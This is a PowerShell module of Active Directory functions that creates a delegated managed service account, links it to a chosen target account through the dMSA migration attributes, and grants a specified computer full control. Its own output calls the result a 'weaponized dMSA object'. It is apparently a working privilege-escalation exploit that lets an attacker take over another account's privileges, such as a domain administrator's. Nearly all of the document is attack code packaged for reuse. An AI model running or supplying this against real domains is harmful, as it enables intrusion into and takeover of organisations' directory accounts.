# Requires -RunAsAdministrator
# Requires -Module ActiveDirectory

function ConvertTo-SidFromAccount {
    param(
        [string]$AccountName
    )
    
    try {
        $domain = Get-ADDomain
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.Filter = "(samaccountname=$AccountName)"
        $result = $searcher.FindOne()
        
        if ($result) {
            $sidBytes = $result.Properties.objectsid[0]
            $sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
            return $sid.Value
        }
        return $null
    }
    catch {
        Write-Host "[!] Error looking up SID for $AccountName : $_" -ForegroundColor Red
        return $null
    }
}

function New-DelegatedMSA {
    param(
        [string]$Path,
        [string]$Name,
        [string]$Computer,
        [string]$Target
    )
    
    try {
        $currentDomain = Get-ADDomain
        $childName = "CN=$Name"
        
        # Create the new dMSA object
        $parentEntry = New-Object DirectoryServices.DirectoryEntry("LDAP://$Path")
        $newChild = $parentEntry.Children.Add($childName, "msDS-DelegatedManagedServiceAccount")
        
        Write-Host "[+] Adding dnshostname $Name.$($currentDomain.DNSRoot)" -ForegroundColor Green
        $newChild.Properties["dnshostname"].Add("$Name.$($currentDomain.DNSRoot)")
        
        Write-Host "[+] Adding samaccountname $Name`$" -ForegroundColor Green
        $newChild.Properties["samaccountname"].Add("$Name`$")
        
        # Find target account
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.Filter = "(samaccountname=$Target)"
        $result = $searcher.FindOne()
        
        if (-not $result) {
            Write-Host "[!] Cannot find account $Target" -ForegroundColor Red
            return $null
        }
        
        $targetDN = $result.Properties.distinguishedname[0]
        Write-Host "[+] $Target's DN identified: $targetDN" -ForegroundColor Green
        
        Write-Host "[+] Attempting to write msDS-ManagedAccountPrecededByLink" -ForegroundColor Green
        $newChild.Properties["msDS-ManagedAccountPrecededByLink"].Add($targetDN)
        
        Write-Host "[+] Wrote attribute successfully" -ForegroundColor Green
        Write-Host "[+] Attempting to write msDS-DelegatedMSAState attribute" -ForegroundColor Green
        $newChild.Properties["msDS-DelegatedMSAState"].Value = 2
        
        Write-Host "[+] Attempting to set access rights on the dMSA object" -ForegroundColor Green
        
        $sid = ConvertTo-SidFromAccount -AccountName $Computer
        
        if (-not $sid) {
            Write-Host "[!] Cannot find computer account" -ForegroundColor Red
            return $null
        }
        
        # Create security descriptor
        $sdString = "O:S-1-5-32-544D:(A;;0xf01ff;;;$sid)"
        $rsd = New-Object System.Security.AccessControl.RawSecurityDescriptor($sdString)
        $descriptor = New-Object byte[] $rsd.BinaryLength
        $rsd.GetBinaryForm($descriptor, 0)
        $newChild.Properties["msDS-GroupMSAMembership"].Add($descriptor)
        
        Write-Host "[+] Attempting to write msDS-SupportedEncryptionTypes attribute" -ForegroundColor Green
        $newChild.Properties["msDS-SupportedEncryptionTypes"].Value = 0x1c
        
        Write-Host "[+] Attempting to write userAccountControl attribute" -ForegroundColor Green
        $newChild.Properties["userAccountControl"].Value = 0x1000
        
        $newChild.CommitChanges()
        
        Write-Host "[+] Created dMSA object '$($newChild.Name)' in '$Path'" -ForegroundColor Green
        Write-Host "[+] Successfully weaponized dMSA object" -ForegroundColor Green
        
        return $newChild.Properties["distinguishedName"].Value.ToString()
    }
    catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

function Set-DMSATarget {
    param(
        [string]$TargetAccount,
        [string]$DMSADN
    )
    
    try {
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.Filter = "(samaccountname=$TargetAccount)"
        $result = $searcher.FindOne()
        
        if (-not $result) {
            Write-Host "[!] Cannot find target account $TargetAccount" -ForegroundColor Red
            return
        }
        
        Write-Host "[+] Found target account, attempting to write attributes" -ForegroundColor Green
        $targetEntry = $result.GetDirectoryEntry()
        
        $targetEntry.Properties["msDS-SupersededManagedAccountLink"].Value = $DMSADN
        Write-Host "[+] $DMSADN written to $TargetAccount object" -ForegroundColor Green
        
        $targetEntry.Properties["msDS-SupersededServiceAccountState"].Value = 2
        Write-Host "[+] msDS-SupersededServiceAccountState set to 2" -ForegroundColor Green
        
        $targetEntry.CommitChanges()
        
        Write-Host "[+] Wrote to target account successfully" -ForegroundColor Green
    }
    catch {
        Write-Host "Error setting target: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Example usage function
function New-DMSAAndSetTarget {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path,
        
        [Parameter(Mandatory=$true)]
        [string]$Name,
        
        [Parameter(Mandatory=$true)]
        [string]$Computer,
        
        [Parameter(Mandatory=$true)]
        [string]$Target
    )
    
    # Create the dMSA object
    $dmsaDN = New-DelegatedMSA -Path $Path -Name $Name -Computer $Computer -Target $Target
    
    if ($dmsaDN) {
        # Set the target
        Set-DMSATarget -TargetAccount $Target -DMSADN $dmsaDN
    }
}

# Export functions for use in other scripts
Export-ModuleMember -Function New-DelegatedMSA, Set-DMSATarget, New-DMSAAndSetTarget, ConvertTo-SidFromAccount
